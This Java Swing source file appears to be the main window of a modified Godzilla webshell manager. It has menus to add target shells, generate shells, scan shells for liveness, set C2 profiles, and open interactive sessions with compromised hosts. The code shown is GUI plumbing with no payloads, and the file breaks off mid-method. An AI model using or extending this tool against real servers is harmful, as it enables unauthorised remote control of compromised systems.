package core.ui;

import com.formdev.flatlaf.demo.intellijthemes.IJThemeInfo;
import com.formdev.flatlaf.demo.intellijthemes.IJThemesPanel;
import com.formdev.flatlaf.util.SystemInfo;
import core.ApplicationConfig;
import core.ApplicationContext;
import core.Db;
import core.EasyI18N;
import core.OperationAuditLog;
import core.OperationLogRuntime;
import core.GodzillaObjectInputFilter;
import core.shell.ShellEntity;
import core.ui.component.C2ProfileManage;
import core.ui.component.DataView;
import core.ui.component.AuroraBarPanel;
import core.ui.component.WallpaperLayerPanel;
import core.ui.WallpaperTableStyle;
import core.ui.component.OperationLogPanel;
import core.ui.component.ShellGroup;
import core.ui.component.dialog.AppSetingDialog;
import core.ui.component.dialog.GOptionPane;
import core.ui.component.dialog.GenerateShellLoder;
import core.ui.component.dialog.OperationAuditLogDialog;
import core.ui.component.dialog.UiEffectsSettingsPanel;
import core.ui.component.dialog.PluginManage;
import core.ui.component.frame.BasicShellSetting;
import core.ui.component.frame.DatabaseShellSetting;
import core.ui.component.frame.LiveScan;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.KeyEventDispatcher;
import java.awt.KeyboardFocusManager;
import java.awt.PopupMenu;
import java.awt.Toolkit;
import java.awt.Window;
import java.awt.AWTEvent;
import java.awt.event.AWTEventListener;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.StringSelection;
import java.awt.event.ActionEvent;
import java.awt.event.KeyEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Vector;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.BorderFactory;
import javax.swing.JComponent;
import javax.swing.tree.DefaultTreeCellRenderer;
import javax.swing.tree.TreeCellRenderer;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.MenuElement;
import javax.swing.MenuSelectionManager;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import util.Log;
import util.StdoutTee;
import util.automaticBindClick;
import util.ipdb.IpLocationService;

public class MainActivity extends JFrame {
    private static final Pattern LOG_LINE_STD = Pattern.compile(
            "\\[[^]]+] Time:\\d{4}-\\d{2}-\\d{2} (\\d{2}:\\d{2}:\\d{2}) ThreadId:\\d+ Message: (.*)");
    private static final Pattern LOG_LINE_SUPER = Pattern.compile(
            "\\[[^]]+] Time:\\d{4}-\\d{2}-\\d{2} (\\d{2}:\\d{2}:\\d{2}) LastStackTrace:.* ThreadId:\\d+ Message: (.*)");
    private static final String SHELL_TABLE_COL_LOCATION = "\u5f52\u5c5e\u5730";
    private static MainActivity mainActivityFrame;
    private static JMenuBar menuBar;
    private static JMenu menuBarAboutMenu;
    private static final List<JMenu> menusPendingForMenuBar = new ArrayList<>();
    private static boolean generateDialogAutoCloseInstalled;
    private static boolean stdoutTeeInstalled;
    private JMenu targetMenu;
    private JMenu aboutMenu;
    private JMenu attackMenu;
    private JMenu configMenu;
    private static JMenu pluginMenu;
    private DataView shellView;
    private JScrollPane shellViewScrollPane;
    private static JPopupMenu shellViewPopupMenu;
    private Vector<String> columnVector;


    private JSplitPane splitPane;
    private JSplitPane verticalMainSplit;
    private OperationLogPanel operationLogPanel;
    private ShellGroup shellGroupTree;
    private String currentGroup;
    private JLabel statusLabel;
    private AuroraBarPanel statusAuroraPanel;
    private JMenuItem copyselectItem;
    private JMenuItem interactMenuItem;
    private JMenuItem interactCacheMenuItem;
    private JMenuItem removeShell;
    private JMenuItem editShell;
    private JMenuItem refreshShell;
    private JPanel mainRootPanel;
    private WallpaperLayerPanel wallpaperLayer;
    private JScrollPane shellGroupScrollPane;

    private static void hideShellViewPopupLater() {
        SwingUtilities.invokeLater(() -> {
            if (shellViewPopupMenu != null) {
                shellViewPopupMenu.setVisible(false);
            }

            MenuSelectionManager.defaultManager().clearSelectedPath();
        });
    }
  
    private static void bindAutoHidePopup(JMenuItem menuItem) {
        if (menuItem != null) {
            menuItem.addActionListener((e) -> {
                hideShellViewPopupLater();
            });
        }
    }

    private static String simplifyLogLine(String raw) {
        if (raw == null) {
            return "";
        }
        String t = raw.trim();
        Matcher mSuper = LOG_LINE_SUPER.matcher(t);
        if (mSuper.find()) {
            return "[" + mSuper.group(1) + "] " + mSuper.group(2);
        }
        Matcher mStd = LOG_LINE_STD.matcher(t);
        if (mStd.find()) {
            return "[" + mStd.group(1) + "] " + mStd.group(2);
        }
        int msgIdx = t.lastIndexOf(" Message: ");
        if (msgIdx >= 0) {
            return t.substring(msgIdx + " Message: ".length());
        }
        return t;
    }

    private static void insertMenuBeforeAbout(JMenu menu) {
        if (menuBar == null || menu == null) {
            return;
        }
        int idx = menuBar.getMenuCount();
        if (menuBarAboutMenu != null) {
            for (int i = 0; i < menuBar.getMenuCount(); i++) {
                if (menuBar.getMenu(i) == menuBarAboutMenu) {
                    idx = i;
                    break;
                }
            }
        }
        menuBar.add(menu, idx);
        menuBar.revalidate();
    }

    private static void flushPendingMenusForMenuBar() {
        synchronized (menusPendingForMenuBar) {
            for (JMenu m : menusPendingForMenuBar) {
                insertMenuBeforeAbout(m);
            }
            menusPendingForMenuBar.clear();
        }
    }

    private static void initStatic() {
        menuBar = new JMenuBar();
        pluginMenu = new JMenu("\u63d2\u4ef6");
        shellViewPopupMenu = new JPopupMenu();
        AppSetingDialog.registerPluginSeting("\u754c\u9762\u6548\u679c", UiEffectsSettingsPanel.class);
    }

    public MainActivity() {
        this.initVariable();
        EasyI18N.installObject(this);
    }

    private void initVariable() {
        this.setLayout(new BorderLayout(2, 2));
        this.currentGroup = "/";
        this.operationLogPanel = new OperationLogPanel();
        OperationLogRuntime.bootstrap(this.operationLogPanel);
        if (!stdoutTeeInstalled) {
            stdoutTeeInstalled = true;
            final OperationLogPanel logSink = this.operationLogPanel;
            StdoutTee.setLineConsumer((line) -> logSink.appendLine(simplifyLogLine(line)));
            StdoutTee.install();
        }
        this.statusLabel = new JLabel("status");
        this.statusLabel.setOpaque(false);
        this.statusLabel.setForeground(ModernUi.STATUS_BAR_FG);
        this.statusAuroraPanel = new AuroraBarPanel(AuroraBarPanel.Variant.STATUS_DARK);
        this.statusAuroraPanel.add(this.statusLabel, BorderLayout.WEST);
        Vector<Vector<String>> headerRow = Db.getAllShell();
        this.columnVector = (Vector)headerRow.get(0).clone();
        this.columnVector.add(SHELL_TABLE_COL_LOCATION);
        this.shellView = new DataView((Vector)null, this.columnVector, -1, -1);
        this.refreshShellView();
        this.shellView.setSelectionMode(2);
        this.shellView.setShowGrid(false);
        this.shellView.setFillsViewportHeight(true);
        WallpaperTableStyle.applyToShellTable(this.shellView);
        this.splitPane = new JSplitPane(1);
        this.shellGroupTree = new ShellGroup();
        this.splitPane.setRightComponent(this.shellViewScrollPane = new JScrollPane(this.shellView));
        this.shellViewScrollPane.setBorder(BorderFactory.createEmptyBorder());
        this.splitPane.setLeftComponent(this.shellGroupScrollPane = new JScrollPane(this.shellGroupTree));
        this.shellGroupScrollPane.setMinimumSize(new Dimension(0, 0));
        this.shellGroupTree.setMinimumSize(new Dimension(0, 0));
        this.shellGroupScrollPane.getViewport().setMinimumSize(new Dimension(0, 0));
        this.verticalMainSplit = new JSplitPane(0, this.splitPane, this.operationLogPanel);
        this.verticalMainSplit.setResizeWeight(0.74);
        this.verticalMainSplit.setOneTouchExpandable(true);
        this.verticalMainSplit.setOpaque(false);
        this.splitPane.setOpaque(false);
        this.shellViewScrollPane.setOpaque(false);
        this.shellViewScrollPane.getViewport().setOpaque(false);
        this.shellViewScrollPane.getViewport().setBackground(new Color(255, 255, 255, 0));
        this.shellGroupScrollPane.setOpaque(false);
        this.shellGroupScrollPane.getViewport().setOpaque(false);
        WallpaperLayerPanel.FrostedWorkArea frostedCenter = new WallpaperLayerPanel.FrostedWorkArea(new BorderLayout(0, 0));
        frostedCenter.add(this.verticalMainSplit, BorderLayout.CENTER);
        this.mainRootPanel = new JPanel(new BorderLayout(0, 0));
        this.mainRootPanel.setOpaque(false);
        this.mainRootPanel.add(frostedCenter, BorderLayout.CENTER);
        this.mainRootPanel.add(this.statusAuroraPanel, BorderLayout.SOUTH);
        this.wallpaperLayer = new WallpaperLayerPanel();
        this.wallpaperLayer.setContentRoot(this.mainRootPanel);
        this.wallpaperLayer.reloadFromSettings();
        this.add(this.wallpaperLayer, BorderLayout.CENTER);
        this.splitPane.setResizeWeight(0.0);
        this.splitPane.setOneTouchExpandable(true);
        this.targetMenu = new JMenu("\u76ee\u6807");
        JMenuItem addShellMenuItem = new JMenuItem("\u6dfb\u52a0");
        addShellMenuItem.setActionCommand("addShell");
        JMenuItem addDatabaseShellMenuItem = new JMenuItem("\u6dfb\u52a0\u6570\u636e\u5e93Shell");
        addDatabaseShellMenuItem.setActionCommand("addDatabaseShell");
        this.targetMenu.add(addShellMenuItem);
        this.targetMenu.add(addDatabaseShellMenuItem);
        bindAutoHidePopup(addShellMenuItem);
        bindAutoHidePopup(addDatabaseShellMenuItem);
        this.attackMenu = new JMenu("\u653b\u51fb");
        JMenuItem shellLiveScanMenuItem = new JMenuItem("\u5b58\u6d3b\u626b\u63cf");
        shellLiveScanMenuItem.setActionCommand("shellLiveScan");
        JMenuItem generateShellMenuItem = new JMenuItem("\u751f\u6210");
        generateShellMenuItem.setActionCommand("generateShell");
        this.attackMenu.add(generateShellMenuItem);
        this.attackMenu.add(shellLiveScanMenuItem);
        bindAutoHidePopup(generateShellMenuItem);
        bindAutoHidePopup(shellLiveScanMenuItem);
        this.configMenu = new JMenu("\u914d\u7f6e");
        JMenuItem pluginConfigMenuItem = new JMenuItem("\u63d2\u4ef6\u7ba1\u7406");
        pluginConfigMenuItem.setActionCommand("pluginConfig");
        JMenuItem appConfigMenuItem = new JMenuItem("\u5e94\u7528\u8bbe\u7f6e");
        appConfigMenuItem.setActionCommand("appConfig");
        JMenuItem c2ProfileConfigMenuItem = new JMenuItem("C2Profile \u8bbe\u7f6e");
        c2ProfileConfigMenuItem.setActionCommand("c2ProfileConfig");
        this.configMenu.add(c2ProfileConfigMenuItem);
        this.configMenu.add(appConfigMenuItem);
        this.configMenu.add(pluginConfigMenuItem);
        JMenuItem operationAuditLogMenuItem = new JMenuItem("\u64cd\u4f5c\u5ba1\u8ba1\u65e5\u5fd7");
        operationAuditLogMenuItem.setActionCommand("showOperationAuditLog");
        this.configMenu.add(operationAuditLogMenuItem);
        bindAutoHidePopup(c2ProfileConfigMenuItem);
        bindAutoHidePopup(appConfigMenuItem);
        bindAutoHidePopup(pluginConfigMenuItem);
        bindAutoHidePopup(operationAuditLogMenuItem);
        this.aboutMenu = new JMenu("\u5173\u4e8e");
        JMenuItem aboutMenuItem = new JMenuItem("\u5173\u4e8e");
        aboutMenuItem.setActionCommand("about");
        this.aboutMenu.add(aboutMenuItem);
        bindAutoHidePopup(aboutMenuItem);
        this.shellGroupTree.setActionDbclick((e) -> {
            String nextGroup = this.shellGroupTree.GetSelectFile().trim();
            OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u5207\u6362\u5206\u7ec4", nextGroup);
            this.currentGroup = nextGroup;
            this.refreshShellView();
        });
        menuBar.add(this.targetMenu);
        menuBar.add(this.attackMenu);
        menuBar.add(this.configMenu);
        menuBar.add(pluginMenu);
        menuBar.add(this.aboutMenu);
        menuBarAboutMenu = this.aboutMenu;
        flushPendingMenusForMenuBar();
        this.setJMenuBar(menuBar);
        automaticBindClick.bindMenuItemClick(menuBar, (Map)null, this);
        this.copyselectItem = new JMenuItem("\u590d\u5236\u9009\u4e2d");
        this.copyselectItem.setActionCommand("copyShellViewSelected");
        this.interactMenuItem = new JMenuItem("\u4ea4\u4e92");
        this.interactMenuItem.setActionCommand("interact");
        this.interactCacheMenuItem = new JMenuItem("\u8fdb\u5165\u7f13\u5b58");
        this.interactCacheMenuItem.setActionCommand("interactCache");
        this.removeShell = new JMenuItem("\u79fb\u9664");
        this.removeShell.setActionCommand("removeShell");
        this.editShell = new JMenuItem("\u7f16\u8f91");
        this.editShell.setActionCommand("editShell");
        this.refreshShell = new JMenuItem("\u5237\u65b0");
        this.refreshShell.setActionCommand("refreshShellView");
        shellViewPopupMenu.add(this.interactMenuItem);
        shellViewPopupMenu.add(this.interactCacheMenuItem);
        shellViewPopupMenu.add(this.copyselectItem);
        shellViewPopupMenu.add(this.removeShell);
        shellViewPopupMenu.add(this.editShell);
        shellViewPopupMenu.add(this.refreshShell);
        bindAutoHidePopup(this.interactMenuItem);
        bindAutoHidePopup(this.interactCacheMenuItem);
        bindAutoHidePopup(this.copyselectItem);
        bindAutoHidePopup(this.removeShell);
        bindAutoHidePopup(this.editShell);
        bindAutoHidePopup(this.refreshShell);
        this.shellView.setRightClickMenu(shellViewPopupMenu);
        automaticBindClick.bindMenuItemClick(shellViewPopupMenu, (Map)null, this);
        this.installGenerateDialogAutoCloseListener();
        shellViewPopupMenu.addPopupMenuListener(new PopupMenuListener() {
            public void popupMenuWillBecomeVisible(PopupMenuEvent e) {
                MainActivity.this.updateShellViewPopupMenuState();
            }

            public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {
            }

            public void popupMenuCanceled(PopupMenuEvent e) {
            }
        });
        MouseAdapter shellViewPopupMouseAdapter = new MouseAdapter() {
            private void maybeShowPopup(MouseEvent e) {
                if (e.isPopupTrigger() && shellViewPopupMenu != null) {
                    if (MainActivity.this.shellView != null) {
                        int row = MainActivity.this.shellView.rowAtPoint(e.getPoint());
                        if (row >= 0) {
                            return;
                        } else {
                            MainActivity.this.shellView.clearSelection();
                        }
                    }

                    if (!shellViewPopupMenu.isVisible()) {
                        shellViewPopupMenu.show(e.getComponent(), e.getX(), e.getY());
                    }
                }
            }

            public void mousePressed(MouseEvent e) {
                this.maybeShowPopup(e);
            }

            public void mouseReleased(MouseEvent e) {
                this.maybeShowPopup(e);
            }
        };
        this.shellView.addMouseListener(shellViewPopupMouseAdapter);
        this.shellViewScrollPane.getViewport().addMouseListener(shellViewPopupMouseAdapter);
        this.applyMainWindowLayout();
        this.addWindowListener(new WindowAdapter() {
            @Override
            public void windowOpened(WindowEvent e) {
                SwingUtilities.invokeLater(() -> MainActivity.this.applySplitDividerProportions());
            }
        });
        this.setLocationRelativeTo((Component)null);
        this.applyUiEffectsFromSettings();
        this.setVisible(true);
        this.setDefaultCloseOperation(3);
    }

    public void applyUiEffectsFromSettings() {
        this.applyWindowOpacity();
        ShellLinkedWindowChrome.applyOpacityToAllShellWindows();
        boolean aurora = ModernUi.isAuroraGradientEnabled();
        if (this.statusAuroraPanel != null) {
            this.statusAuroraPanel.setAuroraEnabled(aurora);
        }
        if (this.operationLogPanel != null) {
            this.operationLogPanel.setAuroraEnabled(aurora);
        }
    }

    public void reloadWallpaper() {
        if (this.wallpaperLayer != null) {
            this.wallpaperLayer.reloadFromSettings();
        }
        ShellLinkedWindowChrome.reloadWallpaperOnAllShellWindows();
        repaint();
    }

    private void applyWindowOpacity() {
        ModernUi.applyWindowOpacityTo(this);
    }

    private static float computeMainUiScale(Rectangle usable) {
        float w = usable.width / 1366f;
        float h = usable.height / 768f;
        float s = Math.min(w, h);
        if (usable.width <= 1440) {
            s = Math.min(s, 1.02f);
        }
        if (usable.width <= 1280 || usable.height <= 800) {
            s = Math.min(s, 1.0f);
        }
        if (usable.width <= 1152) {
            s = Math.min(s, 0.98f);
        }
        return Math.max(0.92f, Math.min(1.14f, s));
    }

    private void applyMainWindowLayout() {
        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        Rectangle usable = ge.getMaximumWindowBounds();
        float scale = computeMainUiScale(usable);
        int gw = usable.width;
        int gh = usable.height;
        int targetW = Math.min(Math.round(gw * 0.92f), Math.round(1560 * Math.min(scale, 1.05f)));
        int targetH = Math.min(Math.round(gh * 0.88f), Math.round(920 * Math.min(scale, 1.05f)));
        targetW = Math.max(820, Math.min(targetW, gw - 16));
        targetH = Math.max(520, Math.min(targetH, gh - 16));
        this.setSize(targetW, targetH);
        this.setMinimumSize(new Dimension(880, 520));
        float marginFactor = Math.min(scale, 1.0f);
        int margin = Math.max(3, Math.round(6 * marginFactor));
        if (this.mainRootPanel != null) {
            this.mainRootPanel.setBorder(BorderFactory.createEmptyBorder(margin, margin, margin, margin));
        }
        if (this.operationLogPanel != null) {
            this.operationLogPanel.applyUiScale(scale);
            int logMinH = Math.max(88, Math.round(108 * Math.min(scale, 1.06f)));
            this.operationLogPanel.setMinimumSize(new Dimension(0, logMinH));
        }
        this.configureShellGroupTree(scale);
        this.splitPane.setContinuousLayout(true);
        int div = Math.max(5, Math.round(7 * scale));
        this.splitPane.setDividerSize(div);
        this.verticalMainSplit.setContinuousLayout(true);
        this.verticalMainSplit.setDividerSize(div);
        Font statFont = UIManager.getFont("Label.font");
        if (statFont != null) {
            float statSize = Math.max(11f, Math.min(14f, statFont.getSize2D() * Math.min(scale, 1.06f)));
            this.statusLabel.setFont(statFont.deriveFont(Font.PLAIN, statSize));
        }
        int padV = Math.max(4, Math.round(6 * marginFactor));
        int padH = Math.max(8, Math.round(14 * marginFactor));
        this.statusAuroraPanel.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createMatteBorder(1, 0, 0, 0, new Color(255, 255, 255, 55)),
                BorderFactory.createEmptyBorder(padV, padH, padV, padH)));
        this.statusLabel.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 0));
        if (this.shellView != null) {
            int rowH = Math.max(26, Math.round(28 * Math.min(scale, 1.06f)));
            this.shellView.setRowHeight(rowH);
        }
        Font menuFont = UIManager.getFont("Menu.font");
        if (menuFont != null && menuBar != null) {
            float menuSize = Math.max(11f, Math.min(14f, menuFont.getSize2D() * Math.min(scale, 1.04f)));
            menuBar.setFont(menuFont.deriveFont(Font.PLAIN, menuSize));
        }
    }

    private void configureShellGroupTree(float scale) {
        if (this.shellGroupTree == null) {
            return;
        }
        float tight = Math.min(scale, 1.03f);
        int rowH = Math.max(18, Math.min(22, Math.round(19 * tight)));
        this.shellGroupTree.setRowHeight(rowH);
        this.shellGroupTree.setOpaque(false);
        this.shellGroupTree.setBackground(new Color(255, 255, 255, 0));
        if (this.shellGroupScrollPane != null) {
            this.shellGroupScrollPane.getViewport().setBackground(new Color(255, 255, 255, 0));
        }
        TreeCellRenderer base = this.shellGroupTree.getCellRenderer();
        if (base instanceof DefaultTreeCellRenderer) {
            DefaultTreeCellRenderer r = (DefaultTreeCellRenderer) base;
            int inset = Math.max(0, Math.round(2 * tight));
            r.setBorder(BorderFactory.createEmptyBorder(0, inset, 0, inset));
        }
        if (this.shellGroupScrollPane != null) {
            this.shellGroupScrollPane.setBorder(BorderFactory.createEmptyBorder());
        }
    }

    private void applySplitDividerProportions() {
        if (this.splitPane.getWidth() > 0) {
            this.splitPane.setDividerLocation(0);
        }
        if (this.verticalMainSplit.getHeight() > 0) {
            this.verticalMainSplit.setDividerLocation(0.74);
        }
    }

    private void hideShellViewPopupMenu() {
        hideShellViewPopupLater();
    }

    private void installGenerateDialogAutoCloseListener() {
        if (generateDialogAutoCloseInstalled) {
            return;
        }

        generateDialogAutoCloseInstalled = true;
        Toolkit.getDefaultToolkit().addAWTEventListener(new AWTEventListener() {
            public void eventDispatched(AWTEvent event) {
                if (event instanceof WindowEvent) {
                    WindowEvent we = (WindowEvent)event;
                    if (we.getID() == WindowEvent.WINDOW_OPENED) {
                        Window w = we.getWindow();
                        if (w instanceof JDialog) {
                            JDialog d = (JDialog)w;
                            String title = d.getTitle();
                            if (title != null && title.toLowerCase().contains("generateshell")) {
                                MainActivity.this.hookGenerateButtonInComponent(d.getContentPane(), d);
                            }
                        }
                    }
                }

            }
        }, AWTEvent.WINDOW_EVENT_MASK);
    }

    private void updateShellViewPopupMenuState() {
        boolean hasRowSelected = this.shellView != null && this.shellView.getSelectedRow() >= 0;
        if (this.interactMenuItem != null) {
            this.interactMenuItem.setEnabled(hasRowSelected);
            this.interactMenuItem.setVisible(hasRowSelected);
        }
        if (this.interactCacheMenuItem != null) {
            this.interactCacheMenuItem.setEnabled(hasRowSelected);
            this.interactCacheMenuItem.setVisible(hasRowSelected);
        }
        if (this.copyselectItem != null) {
            this.copyselectItem.setEnabled(hasRowSelected);
            this.copyselectItem.setVisible(hasRowSelected);
        }
        if (this.removeShell != null) {
            this.removeShell.setEnabled(hasRowSelected);
            this.removeShell.setVisible(hasRowSelected);
        }
        if (this.editShell != null) {
            this.editShell.setEnabled(hasRowSelected);
            this.editShell.setVisible(hasRowSelected);
        }
        if (this.refreshShell != null) {
            this.refreshShell.setEnabled(true);
            this.refreshShell.setVisible(true);
        }
    }

    private void hookGenerateShellDialogAutoClose() {
        SwingUtilities.invokeLater(() -> {
            java.awt.Window[] windows = java.awt.Window.getWindows();
            for(int i = 0; i < windows.length; ++i) {
                java.awt.Window w = windows[i];
                if (w instanceof JDialog) {
                    JDialog d = (JDialog)w;
                    String title = d.getTitle();
                    if (title != null && title.toLowerCase().contains("generateshell")) {
                        java.awt.Component[] comps = d.getContentPane().getComponents();
                        for(int j = 0; j < comps.length; ++j) {
                            this.hookGenerateButtonInComponent(comps[j], d);
                        }
                    }
                }
            }
        });
    }

    private void hookGenerateButtonInComponent(java.awt.Component c, JDialog dialog) {
        if (c instanceof javax.swing.JButton) {
            javax.swing.JButton b = (javax.swing.JButton)c;
            Object installed = b.getClientProperty("autoCloseInstalled");
            if (installed instanceof Boolean && (Boolean)installed) {
                return;
            }

            String text = b.getText();
            if (text != null && (text.equals("\u751f\u6210") || text.equalsIgnoreCase("generate"))) {
                b.addActionListener((e) -> {
                    SwingUtilities.invokeLater(dialog::dispose);
                });
                b.putClientProperty("autoCloseInstalled", Boolean.TRUE);
            }
        }

        if (c instanceof java.awt.Container) {
            java.awt.Component[] children = ((java.awt.Container)c).getComponents();
            for(int i = 0; i < children.length; ++i) {
                this.hookGenerateButtonInComponent(children[i], dialog);
            }
        }
    }



    private void addShellMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u6dfb\u52a0 Shell", "\u5206\u7ec4: " + this.currentGroup);
        new BasicShellSetting((String)null, this.currentGroup);
        this.refreshShellView();
    }

    private void addDatabaseShellMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u6dfb\u52a0\u6570\u636e\u5e93 Shell", "\u5206\u7ec4: " + this.currentGroup);
        new DatabaseShellSetting((String)null, this.currentGroup);
        this.refreshShellView();
    }

    private void generateShellMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u6253\u5f00\u751f\u6210 Shell", "");
        new GenerateShellLoder();
        this.hookGenerateShellDialogAutoClose();
    }

    private void shellLiveScanMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u5b58\u6d3b\u626b\u63cf", "\u5206\u7ec4: " + this.currentGroup);
        new LiveScan(this.currentGroup);
    }

    private void pluginConfigMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u63d2\u4ef6\u7ba1\u7406", "");
        new PluginManage();
    }

    private void appConfigMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u5e94\u7528\u8bbe\u7f6e", "");
        new AppSetingDialog();
    }

    private void c2ProfileConfigMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLog.ui("\u4e3b\u754c\u9762", "C2Profile \u8bbe\u7f6e", "");
        C2ProfileManage.showC2ProfileManage();
    }

    private void showOperationAuditLogMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLogDialog.showDialog(this);
    }

    private void aboutMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u5173\u4e8e", "");
        GOptionPane.showMessageDialog(getFrame(), EasyI18N.getI18nString("\u00a9BeichenDream\u5f3a\u529b\u9a71\u52a8\nMail:beichendream@gmail.com\n"), "About", -1);
    }

    private void copyShellViewSelectedMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        int columnIndex = this.shellView.getSelectedColumn();
        if (columnIndex != -1) {
            Object o = this.shellView.getValueAt(this.shellView.getSelectedRow(), this.shellView.getSelectedColumn());
            if (o != null) {
                String value = (String)o;
                OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u590d\u5236\u8868\u683c\u5355\u5143\u683c", "");
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(value), (ClipboardOwner)null);
                GOptionPane.showMessageDialog(getMainActivityFrame(), "\u590d\u5236\u6210\u529f", "\u63d0\u793a", 1);
            } else {
                GOptionPane.showMessageDialog(getMainActivityFrame(), "\u9009\u4e2d\u5185\u5bb9\u4e3a\u7a7a", "\u63d0\u793a", 2);
            }
        } else {
            GOptionPane.showMessageDialog(getMainActivityFrame(), "\u672a\u9009\u4e2d\u5185\u5bb9", "\u63d0\u793a", 2);
        }

    }

    private void removeShellMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        String[] shellIds = this.getSlectedShellId();
        if (shellIds.length > 0) {
            int n = GOptionPane.showConfirmDialog(getMainActivityFrame(), String.format(EasyI18N.getI18nString("\u786e\u8ba4\u5220\u9664id\u4e3a %s \u7684shell\u5417?"), Arrays.toString((Object[])shellIds)), "\u786e\u8ba4", 0);
            if (n == 0) {
                OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u5220\u9664 Shell", Arrays.toString(shellIds));
                for(int i = 0; i < shellIds.length; ++i) {
                    String shellId = shellIds[i];
                    String shshellInfo = Db.getOneShell(shellId).toString();
                    Log.log("removeShell status:%s  -> %s", new Object[]{Db.removeShell(shellId) > 0, shshellInfo});
                }

                GOptionPane.showMessageDialog(getMainActivityFrame(), "\u5220\u9664\u6210\u529f", "\u63d0\u793a", 1);
                this.refreshShellView();
            } else if (n == 1) {
                GOptionPane.showMessageDialog(getMainActivityFrame(), "\u5df2\u53d6\u6d88");
            }
        }

    }

    private String[] getSlectedShellId() {
        int[] rows = this.shellView.getSelectedRows();
        String[] shellIds = new String[rows.length];

        for(int i = 0; i < shellIds.length; ++i) {
            shellIds[i] = (String)this.shellView.getValueAt(rows[i], 0);
        }

        return shellIds;
    }

    private void editShellMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        String[] shellIds = this.getSlectedShellId();
        if (shellIds.length > 0) {
            OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u7f16\u8f91 Shell", Arrays.toString(shellIds));
            for(int i = 0; i < shellIds.length; ++i) {
                String shellId = shellIds[i];
                String shellUrl = Db.getOneShell(shellId).getUrl();
                if (shellUrl != null && shellUrl.startsWith("jdbc:")) {
                    new DatabaseShellSetting(shellId, this.currentGroup);
                } else {
                    new BasicShellSetting(shellId, this.currentGroup);
                }
            }
        }

    }

    private void interactMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        if (this.shellView.getSelectedRow() < 0) {
            GOptionPane.showMessageDialog(getMainActivityFrame(), "\u8bf7\u5148\u9009\u4e2d\u4e00\u6761\u8bb0\u5f55", "\u63d0\u793a", 2);
            return;
        }

        try {
            String shellId = (String)this.shellView.getValueAt(this.shellView.getSelectedRow(), 0);
            OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u6253\u5f00 Shell \u4ea4\u4e92", shellId);
            ShellManage sm = new ShellManage(Db.getOneShell(shellId));
            ShellLinkedWindowChrome.attach(sm);
        } catch (Throwable var4) {
            GOptionPane.showThrowableMessageDialog(getMainActivityFrame(), "\u4ea4\u4e92Shell\u65f6\u53d1\u751f\u5f02\u5e38", var4);
        }

    }

    private void interactCacheMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        if (this.shellView.getSelectedRow() < 0) {
            GOptionPane.showMessageDialog(getMainActivityFrame(), "\u8bf7\u5148\u9009\u4e2d\u4e00\u6761\u8bb0\u5f55", "\u63d0\u793a", 2);
            return;
        }

        String shellId = (String)this.shellView.getValueAt(this.shellView.getSelectedRow(), 0);

        try {
            if ((new File(String.format("%s/%s/cache.db", "GodzillaCache", shellId))).isFile()) {
                ShellEntity shellEntity = Db.getOneShell(shellId);
                OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u7f13\u5b58\u6a21\u5f0f\u8fdb\u5165\u4ea4\u4e92", shellId);
                shellEntity.setUseCache(true);
                ShellManage sm = new ShellManage(shellEntity);
                ShellLinkedWindowChrome.attach(sm);
            } else {
                GOptionPane.showMessageDialog(getMainActivityFrame(), "\u7f13\u5b58\u6587\u4ef6\u4e0d\u5b58\u5728");
            }
        } catch (Throwable var5) {
            GOptionPane.showThrowableMessageDialog((Component)null, "\u8fdb\u5165\u7f13\u5b58Shell\u65f6\u53d1\u751f\u5f02\u5e38", var5);
        }

    }

    private void updateStatusBarText(int tableRows) {
        int totalShells = Db.getAllShell().size() - 1;
        String filterLabel = "/".equals(this.currentGroup)
                ? "\u5168\u90e8"
